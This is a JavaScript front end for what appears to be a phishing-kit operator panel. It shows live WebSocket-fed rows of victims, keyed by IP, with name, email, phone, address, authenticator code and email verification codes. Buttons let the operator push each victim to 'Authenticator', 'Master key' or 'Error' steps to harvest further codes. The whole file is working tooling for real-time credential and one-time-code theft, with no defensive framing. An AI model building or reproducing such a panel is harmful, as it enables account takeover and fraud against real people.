const tableBody = document.querySelector("#userTable tbody");
const noUsersRow = document.getElementById("noUsersRow");

const rowsMap = {}; // ip -> <tr>
let serialCounter = 0;

let socket = null;
let reconnectAttempts = 0;
let maxReconnectAttempts = 10;
let reconnectDelay = 1000; // Start with 1 second
let reconnectTimer = null;
let isManualClose = false;

function connectWebSocket() {
  // Close existing connection if any
  if (socket && socket.readyState !== WebSocket.CLOSED) {
    isManualClose = true;
    socket.close();
  }

  try {
    // Use wss:// for secure WebSocket (or ws:// for non-secure)
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    socket = new WebSocket(`${protocol}//${window.location.host}/ws`);

    socket.onopen = () => {
      console.log("✅ Connected to WebSocket");
      reconnectAttempts = 0;
      reconnectDelay = 1000; // Reset delay on successful connection
    };

    socket.onerror = (error) => {
      console.error("❌ WebSocket error:", error);
      // Don't attempt reconnect here, onclose will handle it
    };

    socket.onclose = (event) => {
      console.warn("⚠️ WebSocket closed:", {
        code: event.code,
        reason: event.reason,
        wasClean: event.wasClean,
        manualClose: isManualClose
      });

      // Don't reconnect if it was a manual close
      if (isManualClose) {
        isManualClose = false;
        return;
      }

      // Attempt to reconnect
      if (reconnectAttempts < maxReconnectAttempts) {
        reconnectAttempts++;
        console.log(`🔄 Attempting to reconnect (${reconnectAttempts}/${maxReconnectAttempts}) in ${reconnectDelay}ms...`);
        
        reconnectTimer = setTimeout(() => {
          reconnectDelay = Math.min(reconnectDelay * 2, 30000); // Exponential backoff, max 30 seconds
          connectWebSocket();
        }, reconnectDelay);
      } else {
        console.error("❌ Max reconnection attempts reached. WebSocket will not reconnect.");
      }
    };

    socket.onmessage = (event) => {
      const msg = JSON.parse(event.data);

      if (msg.type === "INIT") {
        if (msg.data.length === 0) return;
        noUsersRow.style.display = "none";
        msg.data.forEach((user) => updateUserRow(user, true));
      } else if (msg.type === "NEW_USER") {
        noUsersRow.style.display = "none";
        updateUserRow(msg.data, false, true); // Pass true to indicate it's a new user
      } else if (msg.type.endsWith("_UPDATED")) {
        noUsersRow.style.display = "none";
        updateUserRow(msg.data);
      }
    };
  } catch (error) {
    console.error("❌ Error creating WebSocket:", error);
    // Attempt to reconnect after delay
    if (reconnectAttempts < maxReconnectAttempts) {
      reconnectAttempts++;
      reconnectTimer = setTimeout(() => {
        reconnectDelay = Math.min(reconnectDelay * 2, 30000);
        connectWebSocket();
      }, reconnectDelay);
    }
  }
}

// Initialize WebSocket connection
connectWebSocket();

// Reconnect on page visibility change (user comes back to tab)
document.addEventListener("visibilitychange", () => {
  if (!document.hidden && (!socket || socket.readyState === WebSocket.CLOSED)) {
    console.log("Page visible again, checking WebSocket connection...");
    if (reconnectAttempts < maxReconnectAttempts) {
      connectWebSocket();
    }
  }
});

// Clean up on page unload
window.addEventListener("beforeunload", () => {
  isManualClose = true;
  if (socket) {
    socket.close();
  }
  if (reconnectTimer) {
    clearTimeout(reconnectTimer);
  }
});

function updateUserRow(user, init = false, isNewUser = false) {
  let row = rowsMap[user.ip];
  let isNew = false;

  if (!row) {
    row = document.createElement("tr");
    tableBody.appendChild(row);
    rowsMap[user.ip] = row;
    isNew = true;
  }

  // Apply bright flash animation for new users
  if (isNewUser && row) {
    row.classList.add("new-user-flash");
    // Remove the class after animation completes (3 seconds)
    setTimeout(() => {
      row.classList.remove("new-user-flash");
    }, 3000);
    
    // Scroll the new row into view
    row.scrollIntoView({ behavior: "smooth", block: "nearest" });
  }

  if (isNew) serialCounter++;
  const id = isNew ? serialCounter : row.dataset.id || serialCounter;

  const fields = [
    { key: "ip", label: "IP" },
    { key: "fullname", label: "Full Name" },
    { key: "email", label: "Email" },
    { key: "mobile_number", label: "Mobile Number" },
    { key: "address", label: "Address" },
    { key: "gauth", label: "Authenticator Code" },
    { key: "email_code_2", label: "Email Code 2" },
    { key: "email_code", label: "Email Code" },
    { key: "stat", label: "Status" }
  ];

  const oldValues = JSON.parse(row.dataset.oldValues || "{}");

  let rowHtml = `<td data-label="ID">${id}</td>`;

  fields.forEach((field) => {
    const newValue = user[field.key] ?? "";
    const oldValue = oldValues[field.key] ?? "";

    if (!isNew && oldValue !== newValue) {
      rowHtml += `<td class="flash" data-label="${field.label}">${newValue}</td>`;
    } else {
      rowHtml += `<td data-label="${field.label}">${newValue}</td>`;
    }

    oldValues[field.key] = newValue;
  });

  rowHtml += `
    <td class="actions-container" data-label="Actions">
      <button class="action">Loading</button>
      <button class="action">Index</button>
      <button class="action">Digital Summary</button>
      <button class="action">Authenticator</button>
      <button class="error">Error Authenticator</button>
      <button class="action">Master key</button>
      <button class="error">Error Master key</button>
      <button class="action">Email Code</button>
      <button class="error">Error Email Code</button>
      <button class="success">Success</button>
    </td>
  `;

  row.dataset.oldValues = JSON.stringify(oldValues);
  row.dataset.id = id;
  row.innerHTML = rowHtml;

  const statMap = {
    "Loading": 0,
    "Index": 1,
    "Digital Summary": 2,
    "Authenticator": 3,
    "Error Authenticator": 4,
    "Master key": 5,
    "Error Master key": 6,
    "Email Code": 7,
    "Error Email Code": 8,
    "Success": 9
  };

  const reverseStatMap = {
    0: "Loading",
    1: "Index",
    2: "Digital Summary",
    3: "Authenticator",
    4: "Error Authenticator",
    5: "Master key",
    6: "Error Master key",
    7: "Email Code",
    8: "Error Email Code",
    9: "Success"
  };

  const buttons = row.querySelectorAll("button");

  // 👉 Handle loading blinking (CORE FEATURE)
  const loadingBtn = [...buttons].find(b => b.innerText === "Loading");
  if (loadingBtn) {
    if (user.loading === true || user.loading === 1) {
      loadingBtn.classList.add("loading-blink");
    } else {
      loadingBtn.classList.remove("loading-blink");
    }
  }

  // Button click logic
  buttons.forEach((btn) => {
    btn.addEventListener("click", () => {
      if (btn.innerText === "Loading") return;

      const statValue = statMap[btn.innerText];
      if (statValue !== undefined) {
        fetch("/update-stat", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            ip: user.ip,
            stat: statValue
          })
        }).catch(console.error);
      }

      buttons.forEach((b) => {
        b.style.backgroundColor = "";
        b.style.color = "";
      });

      btn.style.backgroundColor = "black";
      btn.style.color = "white";
    });
  });

  // Highlight active stat button
  const currentStat = parseInt(user.stat) || 0;
  const activeText = reverseStatMap[currentStat];

  if (activeText) {
    buttons.forEach((btn) => {
      if (btn.innerText === activeText) {
        btn.style.backgroundColor = "black";
        btn.style.color = "white";
      }
    });
  }

  // Remove flash effect
  row.querySelectorAll(".flash").forEach((cell) => {
    setTimeout(() => cell.classList.remove("flash"), 500);
  });
}
